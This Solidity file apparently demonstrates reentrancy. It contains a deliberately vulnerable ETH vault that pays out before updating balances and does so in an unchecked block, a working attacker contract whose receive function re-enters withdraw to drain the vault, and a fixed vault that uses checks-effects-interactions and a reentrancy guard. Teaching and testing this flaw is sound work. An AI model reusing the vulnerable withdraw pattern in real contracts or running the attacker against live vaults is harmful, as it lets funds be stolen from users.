// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract VulnerableEthVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "VulnerableEthVault: insufficient");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "VulnerableEthVault: transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract ReentrancyAttacker {
    VulnerableEthVault public immutable vulnerableTarget;
    FixedEthVault public immutable fixedTarget;
    uint256 public attackAmount;
    bool public targetFixed;

    constructor(VulnerableEthVault vulnerableTarget_, FixedEthVault fixedTarget_) {
        vulnerableTarget = vulnerableTarget_;
        fixedTarget = fixedTarget_;
    }

    receive() external payable {
        if (targetFixed) {
            if (address(fixedTarget).balance >= attackAmount) {
                fixedTarget.withdraw(attackAmount);
            }
        } else if (address(vulnerableTarget).balance >= attackAmount) {
            vulnerableTarget.withdraw(attackAmount);
        }
    }

    function attackVulnerable() external payable {
        targetFixed = false;
        attackAmount = msg.value;
        vulnerableTarget.deposit{value: msg.value}();
        vulnerableTarget.withdraw(msg.value);
    }

    function attackFixed() external payable {
        targetFixed = true;
        attackAmount = msg.value;
        fixedTarget.deposit{value: msg.value}();
        fixedTarget.withdraw(msg.value);
    }
}

contract FixedEthVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "FixedEthVault: insufficient");
        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "FixedEthVault: transfer failed");
    }
}
